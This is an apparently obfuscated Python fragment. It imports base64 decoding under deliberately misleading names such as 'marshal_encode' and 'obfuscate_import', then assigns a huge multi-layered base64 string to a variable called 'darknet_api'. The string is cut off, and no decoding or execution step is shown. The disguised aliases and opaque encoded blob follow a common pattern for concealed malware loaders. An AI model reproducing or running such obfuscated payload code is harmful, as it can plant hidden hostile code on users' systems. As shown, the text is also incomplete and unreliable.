from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "V1ZaamVHUXlTWHBUYWtKS1UwVndjMWt4YUZkaVIwMTZWVzV3UkdKV2NEVlpha2wzV2pGc2RWUlVRa3BTTW5nd1dUQmpOV1ZYVWtSUmEwNWhWakJaZUZwRlpITmlWMUpZWlVaU2FVMHhXak5STWpGaFpWZEplVTFIWkd0U01uZ3dWMnhPUTJOSFNsbFJibHBxWW14R2JsbDZTalJpUm5CWlVWZGtXbGRGTVc1WmVrbzBZa1p3V1ZGVmRHaFdla1l6V1dwT1MwMUZiRWxVYWxacVpWaG9NbGt6WkhaVE1rWlpWR3RrYUZkRmNEWmFSVTVDVDFWc1IxVnViR3RXTVZaTVVUSXdOV1ZyZUhWVWFsWnFUVEZLYzFsc1RtNWhWbXQ1WlVkNFdsZEZiSEJUTVVaM1lURndXRmRYWkZwaVZWb3hXVzB4VjJWVmRFUmhlbHBFWVZWR2JsTlZUa05oVm14WVRsaFdZVmRGYkc1VlJrNUNZVlZzY0ZOVmRGbFRSMlEwVjFkNGVtUXdPVFpVV0dSUVpXeEdObGxzYUROUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsbGxSMDVzVWtWYWNGWXpjRU5rUld4RVVWVjBXVk5IWkRSWFYzaDZaREE1TmxSWVpGQmxiRVkyV1d4b05Ga3lWa1ZTYld4WVpXdFZNMVJZY0VwT01EVkZVVzVTU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVwcVdsVlNSMkZXWkRaUlZHUk9aV3RGTTFSclVrZGtSbVExVVd4R1NsSlhaRzVWV0d4Q1pFVnNSazFIWkZKVk1FcE5VMVZXY2xveFJuQlJiRUpLVW14R2JsZEdXalJPUlRGWVUyMUtUbFpJVGpaVVYzQjZUVVV4U0UxSFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VtNW5NRlJXWkV0WmF6RkZZek53VGxKSVRYZFVWRWw0VDBab1NWb3phRnBpU0U0eldXeEdkMWt5VmtWU2JXeFlaV3RGTTFSWWNFSk9NRFZGVkc1U2JWSnVaekJVVm1STFdXc3hObU16Y0U1V1NFMTNWRlZqZDFvd2JFUlJWMlJLVVRCR2JsTlZUa0phTVZwSVlVaENhbVZWU2paWFZFNUxZMGRPU1ZWWFpHaFhSVEZ1V1cwd05VMUZiRWhYYmxwcVlWVktObGRXWkRSaVJXeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1IyVkVVazVXTUhCcFZGVlNlbVZyTVVWamVrSk9UV3BGTkZkRmFHNWxSbXh6WXpOa2FWVllRbXBhVlZKSFlWWmtObEZVWkU1bGEwVXpWR3RTVDJSSFdrZGxSRkpPVmpCd2FWUlZZM2haTWxaRlVtMXNXR1ZyUlROVVdIQktUakExUlZGdVVrcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WV2s5TlJteFpZVEprVkZKNmJEQlhiRTVEVDBWc1IxUnFRbHBYUjNSdVZsUktSMkpXY0ZSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdTbXBhVlZKSFlWWmtObEZ1VWxsVFIyUTBWMWQ0ZW1Rd09UWlVXR1JRWld4R05sbHNhRFJaTWxaRlVtMXNXR1ZyU2pCUk1uZzBUa1V4V0ZOdFNrNVNTRTQyVkZWU2VrMUZNSGxOVkdoUlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFVTBWMFZvYm1WR2JITmpNMlJwVlRCR1RGTlZUa0phTUd4RVVWZGtTbEV3Um01WFJXaHVaVVpzYzJNelpGQmxhekV6VkROd1VtVnRTbGxsUjA1c1VrVmFjRll6Y0VKT01ERTJVVlJrVDFKSFVqQlRWVTVDV2pGa05WRnJjR2xpVmtwM1YycEpORm94UlhsbFNGcHJWakZHYmxaVVNrOWxWMFpaVVdwQ1NsSnFRbTVUVlU1RFdUSldSVkp0YkZobGEwVXpWRmh3UWs0d05VVlVibEp0VW01bk1GUldaRXRaYXpGSVRVVjBTbEV3Um01VFZVNUNXakZvU1ZvemFGcGlTRTR6VkROd1RtUXdPVFpWV0hCcFYwaGtNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWZElhR3BhVlZKSFlWWmtObEZ1VWtSaFZXeHdVMWRrZGxvd2JFUlJWMlJoWWxSc05WTlZaRTlpTVd4WlUxZGthRlo2VW01WFZ6RkhaRmRLZEZadWJGQmFNamx1VTFWT1Fsb3diRVJSVjJSS1UwVTBNVmt6YXpGbGJWSklWVzVhYTFkR1JqRmFSRTVMWTBkU1NGWlhPVnBOYldodldUSnNjbE13YkVSUlYyUktVVEJHYmxOVlRrTmxiVlpaVkZoV2FrMHhTbkpaYWs1WFRVVjRkRmR1VG10WFJUVjJVekJPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa05sYlVwSVZtMTRhbEV5WkROVVIzQkNaVVYwVW1Jd2RFcFJNRVp1VTFWa2QyUnRSbGhPU0doS1VrUkNibE5YZURST1JURllVMjFLVGxKSVRqWlVWM0I2VFVVeFNFMUhaRlJpVkd4M1dXMXNRMlJ0U25CUmJGWmhWak5vYzFkcVRrdGhSMHBVVVd0U2FGSXdXakZaYlRGWFl6QTVjRkZxUWsxaVZFWnpWRVJHUTFOV1JYaFBWbEphVFRCd2Qxa3dhRk5hYkZwWlVXMTBXbGRHU25OWmVrWTBUa1V4V0ZOdFNrNVNla0p3VVRKc1Fsb3diRVJSYmtacFRXMTRNVlJYYkVKUFZXeEVVMWRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa3BUTUd4RVVWZGtTbEl4Y0RKWk1teERXbXRzU0dKSVZrcFRSWEJ2V1cweGEySkZkRVZTV0VKUVdqSTVibE5WVGtKYU1HeEVVVmRrU2xORlNqVlpWbU14VFVWMFNHTklXbWhXZWxJMFZFVmtWMlJXY0VWTlIyeFpVMFZzY0ZNeFJuWmFNR3hFVVZka1NsRXdSbTVUVldoUFl6RndXRlp1WkV4U1JVWXhWR3hPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa05rTWs1MFlraFdhMUV5YUhoWmFrcHpaRlV4Y0dWSGVHbGlWa1UxVTFkNE5HVlZiSEJoTUhSS1VUQkdibE5WVGtKYU1HeEVVVzV3YVZJeFduTlpNRTV1WkRCNGNWWllRa1JoVlVadVUxVk9RMlF5VG5SaVNGWnJVVEpvZUZscVNuTmtWVEZVWlVkNGFXSldSVFZUVjNnMFpWVnNjR0V3ZEVSaVZYQnZXVzB3TVdKSFRuQmFNMEpFV2pOQmQxa3lOWEpPYTA1dVlrYzVZVll3V25KWGJHaEtXakZDVkZGcVpFcGliRm8yVjJ4b1NtUkdiRmhhUjNocFlteEdjRlF5YkV0VWJVbDZZMGhDYVZJemFHOVVTSEJXWkZVeFJGRlhPVmROYlhneFYydGpOVTB5VGpWUmF6bFhVVEJHTkZSVlRUQmtNRGsxVVd4b2FGWjZVWGxVYTFKNldqSldSVmRVUWt4Vk1FcERXVEJvUTJNeGNGZGFSM2hhWVROU2QxcEZUVFJOVlRFMldUTldUbVZzYkc1VE1GWXdVMVphUmsxVk1VMVJNRXA2V1Zaa01HSkZiRVphUjNoYVRXNVNNbE14VGtOU1IwWkpVMjVhYVZZeFZqSlVNRkpHWkZVeFJFNUVRazVTUmtWM1ZFZHdSbVZyT1VSUmJGSmFWakZ3YjFreU1YSmthelZWVkZST1RXRnJNSGxUVnpSM1V6Qk9XRnBIZUd0VFJVcHZXWHBPVGxveFFsUlJibXhoVjBWWmVGZHNhRTlOUjA0MVRsYzFZVmRHUm5aVFZ6RnZUVWRTU1ZGdWNGQmhWR2d5V2tWa2IyRkhVa1JOVjNCcFVqSjRjVmxVU2t0a2JWSkVUa2hrVGxKRlNYcFhiR1JMWWpKSmVsUnFRbHBYUlVvelZFY3hUMlJ0U2xSUFZ6VmhWMFpLTTFkV2FFOWxhM2gwWVVSQ2FWWXpaSEJVUldSdllrWnNXRlZ0ZUdwaWF6QTFXVlZrVjJGR2NFaFdibXhNVlhwVmQxZHNhRzlOUlU1dVlraGthbUpYZURGYVJVNXVZVlpvU0U1WFRtbGlTRTU0VjBaT1ExTkdjRmxWVjJScVVqQmFObGw2VG10a2JVNTBWVmRrYUZJeFdqVlhiRTVDVG10c1JGTlhaRXhsVlVvMldrVm9TbUl4YjNsV2FrSnFVakJhTmxremJISmpSVTV1WWtoa1dsZEZOVFpYUkVvMFkwZEtkR015WkZGVk1FbzFWMnhvUjAxV2NGbFVha0pxWlZSV2RWZHNhRkppTUd4MFlVUkNhMU5GU2paVU1tczBaRzFTU0dGSGFHdFJla1p4V1d0a2MyRnRSWGxUYmxwclVYcFNNMVJWVWtOTk1YQllVMjA1YVUwd05IZFhWbWhEWkRCNGRGUnVXbWxWZW10NFdUSXhNMlJYUmtsVmJsSnBVVEJzZWxsVlpGZGhSbkJJVm01c2FtVnFSblpYYkdSSFlURndXVk5ZUWsxaWJFcHpXbFZvVWxNd1RsbGFSM2hhWVZWRk5WTlZhRXRpUjA1WlZtMTRhazB4U2paVVJ6RnJZa2RTUkdGSVpGcFhSVFUyVjBSS05HTkhTblJqTTA1b1VqRmFiMWRyWkZkbFYwNDJUVmM1WVZZd1duSlhiR2hLWTBWT2JtSklaRnBXTWxKelUxVlJkMW94Um5SV2JXaHJWMFpLZDFkdE5WZGpNVlY1VDFSR2FsRXlaM3BYYkdSS1pGZFNTRlpxVW10Uk0yUndXVlZvVTJSSFNrUk9XR1JhVjBWd05sZHNhRXBoVlhSU1lqQndhbEl3V2paWmVrNXJaRzFPZEZWWFpGRlZNRW8yV2tWb1NtSXlUa2hTYlRWaFZYcFdkRmxXWXpGaE1IUkVVMjA1VGxVd2JIZFRNVVoyVTIxT1NGSnVjR3BOTWxJeVdUSXhVbG94UWxSUmJtUmFWMFUxTmxwRVNUVmxWbkJFVGxoc1lWZEZTbnBYVm1SUFlrVjBSRk5VYUdoU1JWVnlVMWRzTTJGVmJIQmhNSFJFVjBWS2IxbDZUazlOTWtsNlUyMTBTbEpFUW01Wk1HUkhaVzFOZWxwSVdtcGlWa1l4V1RJeFYyUXlTa2hTYlhCaFZUSmtjRlZGVFRWaU1ERlZUa2RzVFZFd2JIQlRNVVoyVTIxU1dWUnRlR3BpUkd3elYxWm9UMlZyYkVWTlIyUm9WbnBXTTFwR2FGSmlNR3h6WXpOR1dWVXdTa2RaYlRWVFlrZE9jRkZ1Y0ZwTk1IQjNXVEJvVWxveVRraFNibkJxVFRKU01sa3lNVkphTVVKeFRrZGtTbUZYZEV4Uk1XUnpZbFZzU1ZadWNHRlhSWEJ0V1RCa1IyVnRUalZSVjJoUlZUQktNMWRXYUU5bGJWRjVUMWhzWVZKSE9VeFJNVVp6WkRKT2RHSklWbXRSTW1Sd1ZURmpNV0Z0U1hwVGJteGhWakEwZDFOVmFFTmhSMDE2VkdwT2FVMHdjSEpUVms1RFZsZE9kV0V5WkZwV01sSnZXVlpqTUdSVmJFUk9SMlJOWVZWc2QxRXlaSEpUYlUxNllraHdUV0pXV1RCWlZtaFNZakIwVW1OSGVHeFNNRFZ6V1RCb1Vsb3hTbGxoUjNCaFYwVkpkMWxXWXpWa1ZXeElVbTV3U2xJeFZUSlJNbVJ6WkRKT2RHSklWbXRSTW1oelV6RkdkbE50VFhwaVNIQk5ZbFpaTUZsV2FGSmlNSFJTWWpCMGExZEZOWE5aTW5jMVlrZEtXRkp1UW1sUk1FVTFVMVZrYzJSWFRrbFdha0pNVVRCd1MxbHRNVk5qUm05NVQxZHdhVTF0ZURGVFZWWlhaRVpzV0dKSVRrcFNSemx1VTFkc2NtRnNSbGxVYmtwS1VqRndNbGt5YkVOU2JVcFlVbTVDYVZFd1NrTlhhMlJUWlZad1dWUnVjRVJpYkZvMlYyeG9TMXB0VGtoU2JuQnFUVEpTTWxreU1WSmFNVUpVVVc1Q2FXSnJTWGhhUlU1dVlWWk9XRTVYZEdoV01sSXlWMVJKTldOSFNuQlJiRVphVjBVMU5sTlZUa0pPYTJ4RVUxaENTazFGV2paWldHeERZbGRKZWxOWFpGWlNNRm8yV1hwT2EyUnRUblJWVlhSRVlWVTFTRnBHWXpGaGJWSklZa2hhYVdGVlNYZFpibXhEWW14d1dWVlhaR3RTTW1oelUxVmtUMDFYVG5WVGJYaHBZbXhHYmxwRlpITmtSbkJaVTFWMFlWSXhXblJUVldSUFpHMVNXRTVVUWxsTmJFb3lXa1JKTUdJeGEzbGxSMmhvVm5wQ2QxUXlaSFpUYlUxNVZtMXdhVTFxVm5KWk0yeENUMVZzUkZOWVpFcGFNamxMV1hwT1UyRkhVa2xXYm5CS1VrUkNibE5YYkVwVE1FNVlWRzVPV2xZeWVEQlRWVkYzV2pGcmVXVkhhR2hXZWtJeFdUSXhWMlF5U2toU2JYQmhWVEprY0ZwWWJFcGpNR3h3VTFoQ1NrMVZjSE5aYkdNMVRXMUdXRTVYTlVwU1ZYQTFWMVprVDJOc2NGbFZibkJFV2pKNGNWbHJaRWRqUjBwVVVWUnNTbEl3TlhwWFZtUnpaRVY0ZFZOdGVHcFNNMmh2VjFSS1ZtSXdiSFZOUjJ4TlVUQnNjRk14VGs5Vk1YQllUVmhhYTJKWGVERlhibXhEVVRKT2RGSnRjR2hOYkZsM1dUTmtkbE5zYTNsbFIyaG9WbnBDYmxWR1RrTmhiVXBJVW01Q2FWVjZWalZYYkdoRFl6RnNXRlJ0ZUV4Uk1Hc3lVMWRzTTJGVmJIQmhNbkJXWWxaYU1GbHFUbUZqUjBwMFdUSmtVazFxYkhwWmFra3dVekJPV0ZSdVRscFdNbmd3VTFWUmQxb3hhM2xsUjJob1ZucENNVmt5TVZka01rcElVbTF3WVZVeVpIQlVSVTVLWXpCc2NGTllRa3BOVlhCeldXeGpOVTF0UmxoT1Z6VktVbFUxTWxsc1pFWlRNRTVZVkc1T1dsWXllREJUVlZGM1dqRnJlV1ZIYUdoV2VrSXhXWHBPUTJNeVJsbFZWemxLWWtoa2NGTlhiSEpUTUU1dVlqQndZV0pVYkRWVFZXUXpZekJzU1ZwSVdtcGlWa1kwVTFWa2MyUlZiRWhXYmxaclZucEdjMWt5TVVkTlJuQlVZVWR3YVZJd1duZFpiRTV5VG10cmQyVklXbWxOTUVwM1dXMHhhbG95U1hsT1IyUnJVakpvYzFOVlpFZGxWMDUwVW01T2JGVXdTbnBaVm1oUFRVVk9ibUV3Y0doV01XeHVXa1JKTldWV2NFVlNWMlJSVmtSQ2JsTlhNVk5pUjAxNVZGZHNVR0ZWTlZWWGJHUkhaVlpyZVdGSVFtbGlWMDV1VjIwd05XVlZiRWxhU0ZwcVlsWkdibGxXWXpCYU1XeFpVMjVzV2xkSGRHNVphMlJ6WlcxU1FtSXdjRVJWVjNnMldrVmtSMDFIVWxsVVYyUlJWVEJLY1ZsclpFZGpSMHBYWkVoT1RHVnJjR3RUVkVKcllrZFNTVlZ1UW1saVYwNXVXa1ZrYjJKRmJFbFRiWGhxVFRCS01sbHROVTlpUlU1dVlUQndSRll3Y0RWWGJHUkhZMnRPYm1Fd2NHbFJNRVo1VlVaT1FtVkZUbTVpTUhCcVRURktiMXBGYUZkbGEyeEZUVWRrU21KSVp6QlVWbVJMV1dzeFJXTXpjRTVoYmsxM1ZGVmplRmxyZEhOTlIyUldUVEZLYjFwRmFGZGxhMnhGWWpKa1NtRlZSbmxUVldoUFRVZE9jR0ZJY0d0U01GbDNXa1pvVG1ORmJFUmpNbVJLWWtobk1GUldaRXRaYXpGSVRWZE9hV0ZWYkV4Uk1tUnpZbGRKZWxOWFpGcE5iV2h2V1RKc1EyTkhTbkJSYm5CclVqQlpkMXBHYUU1T2EwNXVZVEJ3YWsweWVEWlVSelZQVFVad1NFOVVSbXRSZWxWNldUSXhjMDFHY0ZSaFIzQm9VakJhTlZNeFRrOVZWMDUwWWtoV2ExSXllREZYYm14RFlrWnNXRlJ0T1VwU1ZUVjJWMVpvU2xNd1RsSmlTSEJzVjBVeE1WbDZUbE5oTWtsNlZtcENUV0pXY0hwYVJtaFBZakIwUkdFeWNGWmlWbHAwV1RJeFYyVnRSa2hpU0ZaaFpWVkpkMWxWWkZaYU1sSklWbTVzYVZZeWVERlhWbVF6VXpCT1VtSkljR2xTTVZweldUQk9ibVF3ZUhGUldHaE1WVEExU0ZreU1WZGlSMVowWWtoV1lXVlZTWGRaVldSV1dqSk9TVk51V21GTk1IQnZXV3hPUTJKWFNYcFRWMlJPVlRCS05sZHNaRTlrYlVwMFZXNXdSRm95T1V4Uk1XUmhaRzFPY0ZGcVVrMVJNRWw2V1dwT1MyRXdiRWhpU0ZaS1VqRmFNVnBHWTNoaVIwNTBVbXBDWVZVeWFIRlphMlJIWTBkS1ZHRjZXa3BOU0dneVdXcE9RMk5IU25SWk1tUnBUV3BTYmxwRlpHOWlSV3hJVW01c2FtSlZXbnBhVms1RFl6SkdXVlJxUWtSYU1uUkxXVlprV2xveVVYbFBXR3hoVVRCRk5WVkdUa0poVjAxNVZtMXdhVTFxVm5KWmVrVTFUVWRKZUU5WGJHbE5hbFY0V1ROc1NrNXJhM2hVYlhoYVYwVndjVmxWWkhOa1ZuQTFVVzB4YVUwd2JHNWFSRWsxWlZad1JGRnVRbWxoVlVwdldUSTFTMkZIVmxSUmJrNW9WMFUwZDFFeVpISlRhMDVaVkcxNFdrMXFiREZYYTJoT1dqRkNWRkZ0Y0dsU01GcDNXV3hhTUU1RmREWlNiVkpLVFVkU2MxcEZhRk5qUjBwMFdUSmthMUl5YUhOVFZXUlBUVmRPZFZOdGVHbGliRVp1VjFSSk5VMVhTblZWVjJSaFVucHJlbGx0WkhaVGEwNVNZa2RzYW1KV1dtOVpXR1IyVTJ0T1dWb3laRXhsYWtKdVZGWkdkbE5yVG01aVJ6RnBUVEJzYmxkSWJFTmpSMHB3VVc1c1dsWjZWblZYYkU1dlkwZEtkVlZYT1dwTmJGcHhXV3BKTVdFeVRqVmhNMEpRWVZVMVRsbHFTVFZrTWtaWVRsYzFTbE5HU25aWGJFNURZVzFKZWxadVZtdFJNRXB5V1dwT2EyUlZUbTVoTUhCcVRXNW9jMWRzYUVKaU1ERlVZVEp3VTJKcmNITlhiR2gzWWtWc1NWVnRPV0ZWTUVweFdXcEtVMkpGYkVoWGJscHFZVlZHTkZOVmFFOWlSbXQ1VDFoV1lWTkZNVXhSTVVaelpESk9kR0pJVm10Uk1tUndVMVZOZDFveFFuQlJhemxoVjBkbmQxTlZaRTlqTVd4WVlraFNTbEl3V25SYVJXUlhaVlZzUkZOWFpFeGxWVW8yV2tWb1NtSXlUWGxXYlhCcFRXcFdjbGt6YkhKYU1IUTFVVmRzU2xORk5YTlhWRWsxWkZad1NWUlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOWGJEUmlSMHAwVlZSc1NtSklhRFZUVjJ4eVlXeEtTR0pJY0dwU01GcDZXbFprYzJSV2NEVlJha0pvVWpGV2JsZFVTVFZOVjBwMVZXMTBhVTB5VWpGVFZWcFRZa2RXU1ZWWFpHaFdlbEp1V2tWa2IySkZiRWxVYldocFZqRldibGxyWkhOa1ZuQlNZakJ3UkZkRk5YTlhWRWsxWkZad1NWUlhaRkZWTUVwM1dXMDFVbUl5VFhsV2JYQnBUV3BXY2xremJISmFNSGhVVVZob1NsRXdOVVpYYkdSUFpWWndXRkp1Y0doV2VsWjFVMVZvVTJJeGNGUlJibkJoVmpBMU1sbHRNVk5sYTA1dVlqSndVMkpzV2pGWFZFNVRZMGRKZVU1SFpHdFNlbWh1VjJwS1YwMUZiRWRXYkZKVFZtdHdWVk5WVm5OVlZXeElVbTVXWVZFd1NrVldSRVpYVkRGYVIxTnNjRVJpVmtwelYyMXNRMkpzY0ZsVmJWcG9WbnBXZEZsdWJHOWpSMHAwVjI1YVRGWkhPVXhSTW1SellWWnNXVk51YkdoV01WbzFVMVZSZDFvd2JIQlRWMnhaVTBka05GZFhlSHBrTURrMlZGaGtVR1ZzUmpaWmJFWjJUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMVhTbGxUUjJRMFYxZDRlbVF5U2xKaU1teEtZVlZzVEZFeFpHRmtiVTV3VVcxd2FGSXdXalZUVldSelpGVnNTRk50YUdwaWEzQjNWMnhvU2s1cmEzZGxTRnBwVFRCS2QxbHRNV3BhTVhCWVVtMXdhRkV3U25GWlZXUkhaVlZzU0dKSVZrcFRSVFIzV1RJeGMyUldjRE5pTUhCRVYwVTBNVmt6YXpGbGJWSklWVzVhYTFkR1JqRmFSRTVMWTBkU1NGWlhPVnBOYldodldUSnNjbUZzVmtsVGJrSnBZbXhLZDFsdE1XcGFNWEJZVW0xd2FGRXdTa1ZaVldSSFpWVk9ibUV3Y0dwTk1uZzJWRWMxVDAxR2NFaFBWRVpyVVhwV2RGbHJhRmRsYlVaRVdqTkNTazFWY0hOWGJUVkxZa2ROZVdGSVFtbGlWMDV1V2tWa2IySkZiRWxWYlhocVlsUkdkMWx0TVVkak1FNXVZVEJ3YWsxdWFITlhiR2hDWWpBeFJFNUlaRTVWTW5SeFZXMDFTMkpHY0ZsalNFSnBZbGRPYmxwRlpHOWlSV3hKVVc1c2FVMXRValZYVm1OM1dqRndkRTlZYkVwU1JWWnVXWHBLVjJGdFNYbE9WM1JxWkRJNVRGRXhaSE5rTUd4RlRVZGtTbUpWVm5CUk1tUnpZVzFKZWxadVZtdFRSVzh4VTFWUmQxb3diSFJTVjJ4RVdqSjRkMWx0TVdGa2EyeEZUVWRrYUZaNlZuUlpibXN4WlZad1dWRnVUbHBXTURWelV6Qk9TMDR3YkhCa01teEtZVmQwY1ZaWE1WZGtSMGw2VjIxNFNsSlZjRFZYVm1Rd1lrZFNTVlJWZEVSV01uZ3hWMjB3TkZveFFsUlJia0pwWWxad01sUkhOVXRpUjA1SVpVZG9XazFzVm5aVFZ6UjNZVlY0UkZOWGJFeFZNRFZVVjJ4amVHUnRVblJXVjJSU1ltdHdiMWxVU2xkTlIwNHpZakJ3YUZaNlZuUlpibXhDVDFWc1NHSklWbUZpVkdneFdUSXhWMlF5U2toU2JYQmhWVEprY0ZReWJFcGpNR3h3VTFoQ1NrMVZjSE5aYkdNMVRXeHdWRkZyVW1sTmJtZ3lXVzFrZGxOdFJsaE9WekZwWlZWRk5WTlZaSE5rVm5CMFQwaFdhbUpXV2pOWmEyUkhZV3h3VkZveWJFMVJNR3g2VTFkc1NtTkZhM2hUYlhocFZucHJlVmRzVGtOU1IwbDVUVmRvUkZveWVIZFpiVEZoWkd0c1JVMUhaR2hXZWxaMFdXNXJNV1Z0VGtobFNFSnJVVEprY0ZkRlRrcGhWWFJTWWpCMFJGWXhjREpaTW14RFlXdDRSRkZxVG1sTk1IQnlVMVZrYzJSVmJFaFdibFpyVm5wR2Mxa3lNVWROUm5CVVlVaENhV0pXY0RKVE1WSjJZV3hTU0U5WVdtcFNNbmd4VjI1c1EyUnRTbkJSYWtKb1VqRldibGRXYUV0bFZteFpZVEprYVZJeWVEWmFSVVoyVTJ0T1dHSkhNVXBUUjFJeVdUSXhVbG94UWxWTlIyUktZbFUxZEZVeFdrSmhWVGx3Vkd4U1lWWXdXalZYVkVwdlkwZEtkRmt5Wkd0TmFtdzFWMnRPUTJSdFNuQlJha0pvVWpGV2JsZFdhRXRsVm14WllUSmthVkl5ZURaYVJVWjJVMnRPVW1KSVFtcFJNRVUxVTFWT1MxbHJkSE5OUjJSWVZsUnNWMVpYYkVOVGJGWkVVVlJhU2xFd2JHNVRNMnhEWTBkS2RGZHVXbGhOYXpGNVZGZDNkMkZzU1hsV2FrSnJVako0TVZkdWJFTk5SMFpJVmxka2EySlZXbnBhUm1SV1V6Qk9VbUV3Y0ZwaWEzQnpWMVprZWxNd1RsSmlSM0JLVVROTk5WTlZVa1pUTUU1U1lqQndZV0pVYkRWVFZXaDJZekJzU1ZwSVdtcGlWa1p1V1Zaak1Gb3hjRmhPVkVacFZqRmFOVmRXYUZOaVJYUklZa2hXWVdKVWFIZFVNbXhQVkZkSmVVOVlaR2hXZWxaMVUxVmpOV1JWYkVsVmJUbGhWVEJLYjFreU5VdGhSMVpVVVc1T2FGZEZOSGRSTW1SeVUyMUdXRmRYWkd0TmFtdzFWMnRPUWs5V1FsUlJWMnhhVFd4d1JWbHFUbGRrVjFKSlUycFdTbUZ0T1hGV1ZFcFhZVWRPZEZSdE9XaFdlbFoxVTFWb2EyUnRUblJWVjJScFRXcFNibHBGWkc5aVJXeElVbTVzYW1KVldURlRWV1EwWTBkTmVsVlZkRVJWVjNSTFYxUkpOVTFYU25WVmJteHNWVEJGTlZOVlRrdFpNa3B6WXpOR1dWVXdTa1ZXUkVaWFZERmFSMU5zY0VwU1J6bHVVMWRzUW1OcmJFaGlTRlpoWWxSc2FWcFhiSHBsVm1oVVZHdG9ZVmRHU1hkWlZtTXhZbXRzU1ZWdE9XRlZNRWw1VjFaa05FMVdjRkppTUhCRVZWZDRjRmt5TVZkaFIwWXpZakJ3UkZkSE9XNVRNMjkzV2pBeFVtSXdkRVJXTVhBeVdUSnNRMkZ0UmtoU2JteEtVako0TVZOVlpITmtNRGx3VkdzeGFVMXFiRE5aVm1NeFltdHNTRlp0YUZwTmJXUnVWMVJLYjJGSFRuQlJia0pwWVZWS05scEZhRXRqUjBwMFdUQjBSRlZYZURaYVZtaE9aRmROZWxWdGRHbE5NVmwzVkVjMWEyVlhSbGxWYlhoTVVqQTFkbGRXYUVwalJXdDRVVzVzYUZaNlZYZFpWbU14WW10c1NGWnRhRnBOYldSdVZWUktiMkZIVG01aU1IQkVWMFUwTVZremF6RmxiVkpJVlc1YWExZEdSakZYYlRFMFRWZE5lVm95T1V4Vk1EVlVWMnhrWVdWV2NGbFViVGxvVm5wV2RWTlZhRk5pTVhCVVVXcENZVmRGY0RCWlZtTXhZVWRLUW1Jd2NFUlhSVFY2VjJ4a1YyUXdkRVZSV0ZaT1ZUSjBjVlZ0TlV0aVJuQlpZMGhDYVdKWFRtNWFSV1J2WWtWc1NWRnViR2xOYlZJMVYxWmpkMW94Y0hSUFdHeEtVa1ZXYmxsNlNsZGhiVWw1VGxkMGFtUXlPVXhSTVdSaFpHMU9jRkZ0Y0doU01GbzFVMVZrYzJSVmJFaFVibHByVm5wVmQxa3lOWEpPYTJ0M1pVaGFhVTB3U25kWmJURnFXakZ3V0ZKdGNHaFJNRXB4V1ZWa1IyVlZiRWhpU0ZaS1UwVTBkMWt5TVhOa1ZuQXpZakJ3UkZkRk5ERlpNMnN4WlcxU1NGVnVXbXRYUmtZeFdrUk9TMk5IVWtoV1Z6bGFUVzFvYjFreWJISmhiRlpKVTI1Q2FXSnNTbmRaYlRGcVdqRndXRkp0Y0doUk1FcEZXVlZrUjJWVlRtNWhNSEJxVFRKNE5sUkhOVTlOUm5CSVQxUkdhMUY2Vm5SWmEyaFhaVzFHUkZvelFrcE5WWEJ6VjIwMVMySkhUWGxoU0VKcFlsZE9ibHBGWkc5aVJXeEpWVzE0YW1KVVJuZFpiVEZIWXpCT2JtRXdjR3BOYm1oelYyeG9RbUl3TVVST1NHaE1WVEExU0ZreU1WZGlSMVowWWtoV1lXVlZTWGRaVldSV1dqSk9TVk51V21GTk1IQnZXV3hPUTJKWFNYcFRWMlJPVlRCS05sZHNaRTlrYlVwMFZXNXdSRm95T1V0WFZ6RkhaVmRPZEdKSGVHcGhWVVUxVTFWT1NtRlZiSE5sUkZKT1ZqQndhVlJWVW5wbGF6RkZZM3BDVGsxcVFreFZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWmplR1ZFVWs1V01IQnBWRlZqZDFNd2JIQlRWMnhFV2pKNGRGbHFUa3BhTVd0NVlVZG9hbUZWU25kWmJXeERZVlpzV1ZOdWJHaFdNVm8xVkRKc1QxUlhTWGxQV0dSb1ZucFdkVk5WWkZkaFJtdDVXakprV2sxdGFHOVpNbXhEWTBkS2NGRnVjR3RUUlhCM1dXMHhhbE13VGxKaVNIQnNWMFV4TVZsNlRsTmhNa2w2Vm1wQ1RXSnRValZaVm1oVFlrVjBTRlJ0T1ZwWFJXeDNVMVJHUTJWWFJsaE9WRUpvVm5wV2RWTlZaRmRoUm10NVdqSmtVazF0YUc5Wk1tUjJVMnRPV1ZScVZtcGxWRlkyV2tWa1UyUnRVbGxWV0ZaaFlsaG5lRmw2U201aU1IUlVWR3hPWVZZeGNEVlhiR2hQWWpKR1dFNVhOVXBUUmtwMlYyeE9RMDFHY0ZsVGJsSm9WbnBXYjFsclJuWlRhMDVaVkc1T1lWWXhXak5UTUZKQ1pGVXhSVkpZUWtwTlJuQTFWMnhrVjA1dFJsaE9WelZLVTBaS2RsZHNUa05rTWs1MFQxYz